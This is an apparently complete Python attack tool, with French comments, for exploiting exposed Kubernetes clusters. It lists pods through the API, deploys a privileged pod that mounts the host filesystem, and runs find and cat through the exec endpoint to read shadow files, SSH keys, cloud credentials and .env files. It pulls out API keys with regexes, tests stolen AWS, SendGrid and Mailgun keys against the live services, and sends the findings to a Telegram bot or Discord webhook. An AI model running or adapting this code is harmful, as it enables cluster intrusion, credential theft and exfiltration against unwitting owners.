#!/usr/bin/env python3
"""
üöÄ WWYV4Q - Kubernetes Advanced Exploitation Master
Author: wKayaa
Date: 2025-06-23 22:28:51 UTC

Module autonome pour exploitation de clusters Kubernetes avec:
- Scan de pods vuln√©rables
- D√©ploiement de pods privil√©gi√©s
- Extraction de credentials d'APIs cloud
- Validation en temps r√©el
- Notifications Telegram/Discord
"""

import asyncio
import aiohttp
import json
import base64
import re
import os
import subprocess
import tempfile
import yaml
import hashlib
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
import requests
import hmac
import hashlib
import time
from pathlib import Path

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üéØ CONFIGURATION ET TYPES
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class CredentialMatch:
    """Structure pour stocker les credentials trouv√©s"""
    type: str
    value: str
    file_path: str
    cluster_endpoint: str
    confidence: float
    validated: bool = False
    validation_result: Dict = field(default_factory=dict)
    extraction_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class ExploitationResult:
    """R√©sultats d'exploitation d'un cluster"""
    cluster_endpoint: str
    status: str
    vulnerable_pods: List[Dict] = field(default_factory=list)
    escalation_pods: List[str] = field(default_factory=list)
    credentials_found: List[CredentialMatch] = field(default_factory=list)
    files_explored: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

class K8sExploitMaster:
    """Classe principale d'exploitation Kubernetes"""
    
    def __init__(self, telegram_token: str = None, telegram_chat_id: str = None,
                 discord_webhook: str = None):
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = datetime.utcnow()
        
        # Configuration Telegram/Discord
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook
        
        # Patterns de d√©tection de credentials
        self.credential_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'sendgrid_api_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
            'mailgun_api_key': r'key-[0-9a-zA-Z]{32}',
            'mailjet_api_key': r'[a-f0-9]{32}',
            'twilio_api_key': r'SK[0-9a-f]{32}',
            'brevo_api_key': r'xkeysib-[a-z0-9]{64}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'generic_api_key': r'["\']?[a-zA-Z0-9_-]{20,}["\']?',
            'password': r'["\']?[a-zA-Z0-9@#$%^&*!]{8,}["\']?'
        }
        
        # Chemins √† explorer
        self.target_paths = [
            '/host/etc/kubernetes/admin.conf',
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/etc/secrets/',
            '/etc/passwd',
            '/etc/shadow',
            '/root/.aws/credentials',
            '/root/.ssh/id_rsa',
            '/home/*/.ssh/id_rsa',
            '/opt/app/.env',
            '/app/.env',
            '/config.yml',
            '/credentials',
            '/secrets.json',
            '/etc/environment'
        ]
        
        # Extensions de fichiers sensibles
        self.sensitive_extensions = ['.env', '.json', '.yml', '.yaml', '.conf', '.config', '.key', '.pem']
        
        # Statistiques
        self.stats = {
            'clusters_scanned': 0,
            'clusters_exploited': 0,
            'pods_deployed': 0,
            'credentials_found': 0,
            'credentials_validated': 0,
            'files_explored': 0
        }
        
        print(f"üöÄ K8s Exploit Master initialis√© - Session: {self.session_id}")

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üîç D√âTECTION ET SCAN
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def scan_vulnerable_pods(self, session: aiohttp.ClientSession, 
                                 cluster_endpoint: str) -> List[Dict]:
        """Scan des pods vuln√©rables dans le cluster"""
        vulnerable_pods = []
        
        try:
            # R√©cup√©ration de la liste des pods
            pods_url = f"{cluster_endpoint}/api/v1/pods"
            
            async with session.get(pods_url, ssl=False, timeout=10) as response:
                if response.status == 200:
                    pods_data = await response.json()
                    
                    for pod in pods_data.get('items', []):
                        vulnerabilities = self._analyze_pod_security(pod)
                        
                        if vulnerabilities:
                            vulnerable_pods.append({
                                'name': pod['metadata']['name'],
                                'namespace': pod['metadata']['namespace'],
                                'vulnerabilities': vulnerabilities,
                                'spec': pod.get('spec', {})
                            })
                            
                            print(f"üö® Pod vuln√©rable trouv√©: {pod['metadata']['name']} "
                                  f"({', '.join(vulnerabilities)})")
                    
        except Exception as e:
            print(f"‚ùå Erreur scan pods: {str(e)}")
            
        return vulnerable_pods

    def _analyze_pod_security(self, pod: Dict) -> List[str]:
        """Analyse de s√©curit√© d'un pod"""
        vulnerabilities = []
        spec = pod.get('spec', {})
        
        # V√©rification hostNetwork
        if spec.get('hostNetwork'):
            vulnerabilities.append('hostNetwork')
            
        # V√©rification hostPID
        if spec.get('hostPID'):
            vulnerabilities.append('hostPID')
            
        # V√©rification serviceAccount
        if spec.get('serviceAccountName') != 'default':
            vulnerabilities.append('custom_serviceAccount')
            
        # V√©rification des conteneurs
        for container in spec.get('containers', []):
            security_context = container.get('securityContext', {})
            
            if security_context.get('privileged'):
                vulnerabilities.append('privileged')
                
            if security_context.get('allowPrivilegeEscalation', True):
                vulnerabilities.append('privilegeEscalation')
                
            if not security_context.get('runAsNonRoot'):
                vulnerabilities.append('runAsRoot')
                
        return vulnerabilities

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üöÄ D√âPLOIEMENT DE PODS PRIVIL√âGI√âS
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def deploy_escalation_pod(self, session: aiohttp.ClientSession,
                                  cluster_endpoint: str, namespace: str = 'default') -> Optional[str]:
        """D√©ploie un pod d'escalade de privil√®ges"""
        
        pod_name = f"escaleroot-{self.session_id}"
        
        # D√©finition du pod privil√©gi√©
        escalation_pod = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": pod_name,
                "namespace": namespace,
                "labels": {
                    "app": "system-diagnostics",
                    "component": "debug-utils"
                }
            },
            "spec": {
                "hostNetwork": True,
                "hostPID": True,
                "hostIPC": True,
                "serviceAccountName": "default",
                "containers": [{
                    "name": "escalation-container",
                    "image": "alpine:latest",
                    "command": ["/bin/sh"],
                    "args": ["-c", "sleep 3600"],
                    "securityContext": {
                        "privileged": True,
                        "allowPrivilegeEscalation": True,
                        "runAsUser": 0,
                        "capabilities": {
                            "add": ["ALL"]
                        }
                    },
                    "volumeMounts": [
                        {
                            "name": "host-root",
                            "mountPath": "/host",
                            "readOnly": False
                        },
                        {
                            "name": "host-proc",
                            "mountPath": "/host/proc",
                            "readOnly": False
                        },
                        {
                            "name": "host-sys",
                            "mountPath": "/host/sys",
                            "readOnly": False
                        }
                    ]
                }],
                "volumes": [
                    {
                        "name": "host-root",
                        "hostPath": {
                            "path": "/",
                            "type": "Directory"
                        }
                    },
                    {
                        "name": "host-proc",
                        "hostPath": {
                            "path": "/proc",
                            "type": "Directory"
                        }
                    },
                    {
                        "name": "host-sys",
                        "hostPath": {
                            "path": "/sys",
                            "type": "Directory"
                        }
                    }
                ],
                "restartPolicy": "Never",
                "tolerations": [
                    {
                        "operator": "Exists"
                    }
                ]
            }
        }
        
        try:
            # D√©ploiement du pod
            deploy_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods"
            
            async with session.post(deploy_url, 
                                  json=escalation_pod,
                                  ssl=False,
                                  timeout=15) as response:
                
                if response.status in [200, 201]:
                    self.stats['pods_deployed'] += 1
                    print(f"‚úÖ Pod privil√©gi√© d√©ploy√©: {pod_name}")
                    
                    # Attendre que le pod soit pr√™t
                    await self._wait_for_pod_ready(session, cluster_endpoint, 
                                                 namespace, pod_name)
                    
                    return pod_name
                else:
                    error_text = await response.text()
                    print(f"‚ùå √âchec d√©ploiement pod: {response.status} - {error_text}")
                    
        except Exception as e:
            print(f"‚ùå Erreur d√©ploiement pod: {str(e)}")
            
        return None

    async def _wait_for_pod_ready(self, session: aiohttp.ClientSession,
                                cluster_endpoint: str, namespace: str, pod_name: str):
        """Attend que le pod soit pr√™t"""
        for _ in range(30):  # 30 tentatives max
            try:
                pod_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/{pod_name}"
                
                async with session.get(pod_url, ssl=False, timeout=5) as response:
                    if response.status == 200:
                        pod_data = await response.json()
                        status = pod_data.get('status', {})
                        
                        if status.get('phase') == 'Running':
                            print(f"‚úÖ Pod {pod_name} pr√™t")
                            return True
                            
            except Exception:
                pass
                
            await asyncio.sleep(2)
            
        print(f"‚ö†Ô∏è Timeout attente pod {pod_name}")
        return False

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üîç EXPLORATION DE FICHIERS ET EXTRACTION
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def explore_pod_filesystem(self, session: aiohttp.ClientSession,
                                   cluster_endpoint: str, namespace: str, 
                                   pod_name: str) -> List[CredentialMatch]:
        """Explore le syst√®me de fichiers du pod pour extraire des credentials"""
        credentials_found = []
        
        for target_path in self.target_paths:
            try:
                # Commande pour explorer le chemin
                command = f"find {target_path} -type f 2>/dev/null | head -100"
                
                output = await self._execute_command_in_pod(
                    session, cluster_endpoint, namespace, pod_name, command
                )
                
                if output:
                    files = output.strip().split('\n')
                    for file_path in files:
                        if file_path and self._is_sensitive_file(file_path):
                            # Lire le contenu du fichier
                            content = await self._read_file_in_pod(
                                session, cluster_endpoint, namespace, 
                                pod_name, file_path
                            )
                            
                            if content:
                                # Extraire les credentials
                                file_credentials = self._extract_credentials_from_content(
                                    content, file_path, cluster_endpoint
                                )
                                credentials_found.extend(file_credentials)
                                self.stats['files_explored'] += 1
                                
            except Exception as e:
                print(f"‚ùå Erreur exploration {target_path}: {str(e)}")
                
        # Recherche de fichiers .env, .json, etc.
        await self._search_sensitive_files(session, cluster_endpoint, 
                                          namespace, pod_name, credentials_found)
        
        return credentials_found

    async def _execute_command_in_pod(self, session: aiohttp.ClientSession,
                                    cluster_endpoint: str, namespace: str,
                                    pod_name: str, command: str) -> Optional[str]:
        """Ex√©cute une commande dans le pod"""
        try:
            # URL pour l'ex√©cution de commandes
            exec_url = (f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/"
                       f"{pod_name}/exec?command=sh&command=-c&command={command}"
                       f"&stdout=true&stderr=true")
            
            async with session.get(exec_url, ssl=False, timeout=10) as response:
                if response.status == 200:
                    return await response.text()
                    
        except Exception as e:
            print(f"‚ùå Erreur ex√©cution commande: {str(e)}")
            
        return None

    async def _read_file_in_pod(self, session: aiohttp.ClientSession,
                              cluster_endpoint: str, namespace: str,
                              pod_name: str, file_path: str) -> Optional[str]:
        """Lit le contenu d'un fichier dans le pod"""
        try:
            command = f"cat '{file_path}' 2>/dev/null"
            return await self._execute_command_in_pod(
                session, cluster_endpoint, namespace, pod_name, command
            )
        except Exception:
            return None

    def _is_sensitive_file(self, file_path: str) -> bool:
        """V√©rifie si un fichier est potentiellement sensible"""
        file_path_lower = file_path.lower()
        
        # Extensions sensibles
        for ext in self.sensitive_extensions:
            if file_path_lower.endswith(ext):
                return True
                
        # Noms de fichiers sensibles
        sensitive_names = ['credential', 'secret', 'password', 'token', 'key', 'config']
        for name in sensitive_names:
            if name in file_path_lower:
                return True
                
        return False

    async def _search_sensitive_files(self, session: aiohttp.ClientSession,
                                    cluster_endpoint: str, namespace: str,
                                    pod_name: str, credentials_found: List):
        """Recherche r√©cursive de fichiers sensibles"""
        
        search_commands = [
            "find /host -name '*.env' 2>/dev/null | head -50",
            "find /host -name '*.json' 2>/dev/null | head -50",
            "find /host -name '*config*' 2>/dev/null | head -50",
            "find /host -name '*credential*' 2>/dev/null | head -50",
            "find /host -name '*secret*' 2>/dev/null | head -50",
            "find /etc -name '*.conf' 2>/dev/null | head -30"
        ]
        
        for command in search_commands:
            try:
                output = await self._execute_command_in_pod(
                    session, cluster_endpoint, namespace, pod_name, command
                )
                
                if output:
                    files = output.strip().split('\n')
                    for file_path in files[:10]:  # Limite √† 10 fichiers par recherche
                        if file_path.strip():
                            content = await self._read_file_in_pod(
                                session, cluster_endpoint, namespace, 
                                pod_name, file_path.strip()
                            )
                            
                            if content:
                                file_credentials = self._extract_credentials_from_content(
                                    content, file_path, cluster_endpoint
                                )
                                credentials_found.extend(file_credentials)
                                
            except Exception as e:
                print(f"‚ùå Erreur recherche fichiers: {str(e)}")

    def _extract_credentials_from_content(self, content: str, file_path: str,
                                        cluster_endpoint: str) -> List[CredentialMatch]:
        """Extrait les credentials du contenu d'un fichier"""
        credentials = []
        
        for cred_type, pattern in self.credential_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            
            for match in matches:
                if self._is_valid_credential(match, cred_type):
                    credential = CredentialMatch(
                        type=cred_type,
                        value=match,
                        file_path=file_path,
                        cluster_endpoint=cluster_endpoint,
                        confidence=self._calculate_confidence(match, cred_type, content)
                    )
                    credentials.append(credential)
                    self.stats['credentials_found'] += 1
                    
                    print(f"üîë Credential trouv√©: {cred_type} dans {file_path}")
                    
        return credentials

    def _is_valid_credential(self, value: str, cred_type: str) -> bool:
        """Valide si une valeur ressemble √† un vrai credential"""
        
        # Filtrer les valeurs trop courtes ou √©videntes
        if len(value) < 8:
            return False
            
        # Patterns invalides
        invalid_patterns = [
            'example', 'test', 'demo', 'placeholder', 'your_key_here',
            'xxxxx', '12345', 'password', 'secret'
        ]
        
        value_lower = value.lower()
        for invalid in invalid_patterns:
            if invalid in value_lower:
                return False
                
        return True

    def _calculate_confidence(self, value: str, cred_type: str, context: str) -> float:
        """Calcule le niveau de confiance d'un credential"""
        confidence = 0.5
        
        # Augmenter si format exact
        if cred_type == 'aws_access_key' and value.startswith('AKIA'):
            confidence += 0.3
        elif cred_type == 'sendgrid_api_key' and value.startswith('SG.'):
            confidence += 0.3
        elif cred_type == 'mailgun_api_key' and value.startswith('key-'):
            confidence += 0.3
            
        # Augmenter si dans un contexte appropri√©
        context_keywords = ['aws', 'sendgrid', 'mailgun', 'api', 'secret', 'key']
        for keyword in context_keywords:
            if keyword.lower() in context.lower():
                confidence += 0.1
                
        return min(confidence, 1.0)

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ‚úÖ VALIDATION DE CREDENTIALS
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def validate_credentials(self, credentials: List[CredentialMatch]):
        """Valide les credentials en temps r√©el"""
        
        for credential in credentials:
            try:
                if credential.type == 'aws_access_key':
                    await self._validate_aws_credentials(credential, credentials)
                elif credential.type == 'sendgrid_api_key':
                    await self._validate_sendgrid_credentials(credential)
                elif credential.type == 'mailgun_api_key':
                    await self._validate_mailgun_credentials(credential)
                    
                if credential.validated:
                    self.stats['credentials_validated'] += 1
                    await self._send_credential_alert(credential)
                    
            except Exception as e:
                print(f"‚ùå Erreur validation {credential.type}: {str(e)}")

    async def _validate_aws_credentials(self, access_key_cred: CredentialMatch,
                                      all_credentials: List[CredentialMatch]):
        """Valide les credentials AWS SES/SNS"""
        
        # Trouver la cl√© secr√®te correspondante
        secret_key = None
        for cred in all_credentials:
            if (cred.type == 'aws_secret_key' and 
                cred.file_path == access_key_cred.file_path):
                secret_key = cred.value
                break
                
        if not secret_key:
            return
            
        try:
            # Test SES
            ses_client = boto3.client(
                'ses',
                aws_access_key_id=access_key_cred.value,
                aws_secret_access_key=secret_key,
                region_name='us-east-1'
            )
            
            response = ses_client.get_send_quota()
            
            access_key_cred.validated = True
            access_key_cred.validation_result = {
                'service': 'AWS SES',
                'quota': f"{response['Max24HourSend']}/day",
                'sent': response['SentLast24Hours'],
                'status': 'active'
            }
            
            # Test SNS
            try:
                sns_client = boto3.client(
                    'sns',
                    aws_access_key_id=access_key_cred.value,
                    aws_secret_access_key=secret_key,
                    region_name='us-east-1'
                )
                
                topics_response = sns_client.list_topics()
                access_key_cred.validation_result['sns_topics'] = [
                    topic['TopicArn'] for topic in topics_response.get('Topics', [])
                ]
                
            except Exception:
                pass
                
            print(f"‚úÖ AWS credentials valid√©s: {access_key_cred.value}")
            
        except Exception as e:
            print(f"‚ùå AWS validation failed: {str(e)}")

    async def _validate_sendgrid_credentials(self, credential: CredentialMatch):
        """Valide les credentials SendGrid"""
        
        try:
            headers = {
                'Authorization': f'Bearer {credential.value}',
                'Content-Type': 'application/json'
            }
            
            # Test API credits
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.sendgrid.com/v3/user/credits',
                                     headers=headers, timeout=10) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        credential.validated = True
                        credential.validation_result = {
                            'service': 'SendGrid',
                            'quota': 'active',
                            'credits': data.get('total', 'unknown')
                        }
                        
                        # Test senders
                        async with session.get('https://api.sendgrid.com/v3/senders',
                                             headers=headers, timeout=10) as senders_response:
                            if senders_response.status == 200:
                                senders_data = await senders_response.json()
                                credential.validation_result['senders'] = [
                                    sender.get('from', {}).get('email', '')
                                    for sender in senders_data
                                ]
                        
                        print(f"‚úÖ SendGrid credentials valid√©s: {credential.value}")
                        
        except Exception as e:
            print(f"‚ùå SendGrid validation failed: {str(e)}")

    async def _validate_mailgun_credentials(self, credential: CredentialMatch):
        """Valide les credentials Mailgun"""
        
        try:
            # Test Mailgun API
            auth = ('api', credential.value)
            
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.mailgun.net/v3/domains',
                                     auth=aiohttp.BasicAuth('api', credential.value),
                                     timeout=10) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        credential.validated = True
                        credential.validation_result = {
                            'service': 'Mailgun',
                            'quota': 'active',
                            'domains': [item.get('name', '') for item in data.get('items', [])]
                        }
                        
                        print(f"‚úÖ Mailgun credentials valid√©s: {credential.value}")
                        
        except Exception as e:
            print(f"‚ùå Mailgun validation failed: {str(e)}")

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üì± NOTIFICATIONS
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def _send_credential_alert(self, credential: CredentialMatch):
        """Envoie une alerte pour credential valid√©"""
        
        message = f"""üö® CREDENTIAL VALID√â D√âTECT√â!

üîë Type: {credential.type.upper()}
üíé Valeur: {credential.value[:20]}...
üìÅ Fichier: {credential.file_path}
üéØ Cluster: {credential.cluster_endpoint}
‚úÖ Validation: {credential.validation_result.get('service', 'Unknown')}
üìä Quota: {credential.validation_result.get('quota', 'Unknown')}
‚è∞ Extraction: {credential.extraction_time}

Session: {self.session_id}"""

        # Telegram
        if self.telegram_token and self.telegram_chat_id:
            await self._send_telegram_message(message)
            
        # Discord
        if self.discord_webhook:
            await self._send_discord_message(message)

    async def _send_telegram_message(self, message: str):
        """Envoie un message Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json={
                    'chat_id': self.telegram_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }, timeout=10) as response:
                    
                    if response.status == 200:
                        print("‚úÖ Message Telegram envoy√©")
                    else:
                        print(f"‚ùå Erreur Telegram: {response.status}")
                        
        except Exception as e:
            print(f"‚ùå Erreur Telegram: {str(e)}")

    async def _send_discord_message(self, message: str):
        """Envoie un message Discord"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.discord_webhook, json={
                    'content': f"```\n{message}\n```"
                }, timeout=10) as response:
                    
                    if response.status in [200, 204]:
                        print("‚úÖ Message Discord envoy√©")
                    else:
                        print(f"‚ùå Erreur Discord: {response.status}")
                        
        except Exception as e:
            print(f"‚ùå Erreur Discord: {str(e)}")

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üéØ ORCHESTRATION PRINCIPALE
